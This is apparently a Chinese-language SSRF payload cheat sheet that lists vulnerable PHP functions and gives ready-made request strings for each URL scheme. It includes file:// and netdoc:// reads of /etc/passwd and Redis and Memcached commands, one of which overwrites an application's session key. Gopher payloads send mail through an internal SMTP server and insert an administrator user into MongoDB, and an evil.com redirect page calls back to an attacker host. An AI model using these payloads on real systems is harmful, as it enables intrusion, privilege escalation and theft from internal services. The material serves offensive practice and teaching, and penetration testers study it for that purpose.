# SSRF

PHP函数：

+ file_get_contents

+ fsockopen

+ curl_exec

+ fopen

+ mdf_file

## 协议

(1)HTTP/HTTPS

```html
ssrf.php?page=http://127.0.0.1:80
ssrf.php?page=http://127.0.0.1:8080
ssrf.php?page=https://127.0.0.1
```

(2)File

```html
ssrf.php?page=file:///etc/passwd
ssrf.php?page=file://\/\/etc/passwd
```

(3)Dict

```html
dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
ssrf.php?page=dict://服务器地址:11111/
```

(4)文件传输协议

```html
ftp://user:password@目标站点/  //FTP协议
tftp://目标站点/../file.txt //TFTP协议
sftp://目标站点:11111/  //SFTP协议
```

(5)LDAP

```html
ssrf.php?page=ldap://localhost:11211/%0astats%0aquit
```

(6)SMB

```html
ssrf.php?page=smb://server/share
```

(7)Redis/Memcached

Redis
```html
/proxy?url=redis://Redis服务器地址:6379/set%20mykey%20myvalue
```

Memcached
```html
/proxy?url=memcached://Memcached服务器地址:11211/stats
```

```html
/proxy?url=memcached://Memcached服务器地址:11211/set%20session_user_id%200%20200%2010
//用值0覆盖Memcached中应用程序的会话密钥（session_user_id）
/proxy?url=memcached://Memcached服务器地址:11211/get%20session_user_id
//获取密钥session_user_id的值，用于验证先前的设置命令是否成功
```

(8)Gopher

格式
```html
gopher://host:port/selector
```

与SMTP通信发送电子邮件
```html
GET /ssrf?url=gopher://内部SMTP服务器地址:25/_MAIL%20FROM%3A%3Csnowwolf%40test.com%3E%0D%0ARCP%54%20TO%3A%3Cuser%40example.com%3E%0D%0ADATA%0D%0ASubject%3A%20SSRF%20Test%0D%0A%0D%0AThis%20is%20an%20email%20sent%20via%20SSRF%20exploit.%0D%0A.%0D%0AQUIT%0D%0A HTTP/1.1
```

SMTP页面
```html
<?php
        $commands = array(
                'HELO victim.com',
                'MAIL FROM: <admin@ghostwolflab.com>',
                'RCPT To: <admin@test.com>',
                'DATA',
                'Subject: @security!',
                'Hello, woot woot!',
                '.'
        );

        $payload = implode('%0A', $commands);

        header('Location: gopher://0:25/_'.$payload);
?>
```

创建MongoDB用户
```html
gopher://内部MongoDB服务器地址:27017/_%a0%00%00%00%00%00%00%00%00%00%00%00%dd%07%00%00%00%00%00%00%00%8b%00%00%00%02insert%00%06%00%00%00users%00%02$db%00%0a%00%00%00percetron%00%04documents%00V%00%00%00%030%00N%00%00%00%02username%00%06%00%00%00admin%00%02password%00%09%00%00%00admin123%00%02permission%00%0e%00%00%00administrator%00%00%00%00
```

HTTP
```html
gopher://<proxyserver>:8080/_GET http://<attacker:80>/x HTTP/1.1%0A%0A
gopher://<proxyserver>:8080/_POST%20http://<attacker>:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body
```

回连1337端口
```html
创建evil.com/redirect.php页面
<?php
header("Location: gopher://攻击者主机:1337/_SSRF%0ATest!");
?>

访问地址
https://目标WEB应用程序/?q=http://evil.com/redirect.php
```


(9)Netdoc

```html
ssrf.php?url=netdoc:///etc/passwd
```
